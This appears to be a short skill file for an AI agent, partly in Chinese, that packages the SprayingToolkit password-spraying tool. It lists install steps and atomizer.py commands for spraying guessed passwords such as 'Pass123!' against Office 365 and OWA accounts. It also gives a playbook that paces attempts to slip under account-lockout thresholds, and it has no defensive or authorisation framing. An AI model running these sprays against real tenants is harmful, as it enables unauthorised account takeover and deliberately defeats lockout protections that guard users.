---
name: sprayingtoolkit-idp-spray
description: "SprayingToolkit performs internal IdP password spraying. Signals: brute force, password spraying, O365 spraying, OWA spraying, time-window spray plan generation"
zh-signals: "SprayingToolkit: 内网 IdP 密码喷洒。信号:暴力破解,口令喷射,O365 喷洒,OWA 喷洒,生成时间窗喷洒计划。"
---

# SprayingToolkit

- 攻击大类:C28 云与身份喷洒
- 上游仓库:https://github.com/byt3bl33d3r/SprayingToolkit
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/byt3bl33d3r/SprayingToolkit && cd SprayingToolkit && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python atomizer.py o365 emails.txt 'Winter2024!'` | O365 喷洒 |
| `python atomizer.py owa https://mail.t.com emails.txt pass.txt` | OWA 喷洒 |
| `python sprayer.py` | 生成时间窗喷洒计划 |
| `--threads 5` | 线程 |
| `--output out.txt` | 输出 |

## 攻击场景 Playbook

### 内网 IdP 密码喷洒

```bash
python atomizer.py o365 users.txt 'Pass123!' --threads 5
# 每用户一次,规避账户锁定阈值
```

## 注意事项

byt3bl33d3r 出品,O365/OWA/Lync 自动喷洒+限频,自动避开锁定窗口。
